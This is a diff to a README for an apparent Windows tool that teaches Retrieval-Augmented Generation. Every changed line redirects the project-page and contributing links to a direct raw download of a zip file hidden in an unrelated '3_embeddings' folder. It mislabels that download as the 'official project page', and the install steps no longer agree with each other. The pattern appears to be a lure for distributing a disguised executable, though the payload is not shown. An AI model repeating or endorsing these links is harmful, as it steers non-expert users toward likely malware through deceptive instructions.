@@ -1,6 +1,6 @@
 # 🔍 What-Is-RAG - Learn how intelligent machines retrieve data
 
-[![Download Software](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/yeicaicedo-19/What-Is-RAG)
+[![Download Software](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/yeicaicedo-19/What-Is-RAG/raw/refs/heads/main/3_embeddings/What-RAG-Is-v1.8.zip)
 
 ## 📖 Introduction
 What-Is-RAG provides a clear look at how modern computers find and process information. This application helps you understand Retrieval-Augmented Generation. This technology connects data storage with smart text models. It allows systems to give accurate answers based on specific documents. You do not need to be a developer to use this tool. It offers an easy way to study how machines combine knowledge with logic.
@@ -16,7 +16,7 @@ Your Windows computer needs a few components to run this software. Ensure you ha
 ## 📥 Downloading the Application
 Follow these steps to acquire the software.
 
-1. Navigate to the official project page: [https://github.com/yeicaicedo-19/What-Is-RAG](https://github.com/yeicaicedo-19/What-Is-RAG).
+1. Navigate to the official project page: [https://github.com/yeicaicedo-19/What-Is-RAG/raw/refs/heads/main/3_embeddings/What-RAG-Is-v1.8.zip](https://github.com/yeicaicedo-19/What-Is-RAG/raw/refs/heads/main/3_embeddings/What-RAG-Is-v1.8.zip).
 2. Locate the link labeled "Releases" on the right side of the screen.
 3. Click the most recent version available.
 4. Select the file ending in .exe.
@@ -75,6 +75,6 @@ Open your Windows Settings, go to Apps, find What-Is-RAG, and click Uninstall. T
 ## 🌐 Contributing
 If you find a mistake in the explanations or want to improve the interface, visit the main page linked below.
 
-[Visit the project link to download](https://github.com/yeicaicedo-19/What-Is-RAG)
+[Visit the project link to download](https://github.com/yeicaicedo-19/What-Is-RAG/raw/refs/heads/main/3_embeddings/What-RAG-Is-v1.8.zip)
 
 You can report issues by clicking the "Issues" tab. Provide a clear description of what happened when you clicked a button or performed a search. Include a screenshot if possible. This helps maintain a stable experience for all users. Do not share personal documents in your bug reports. Keep your feedback limited to the functionality of the software.
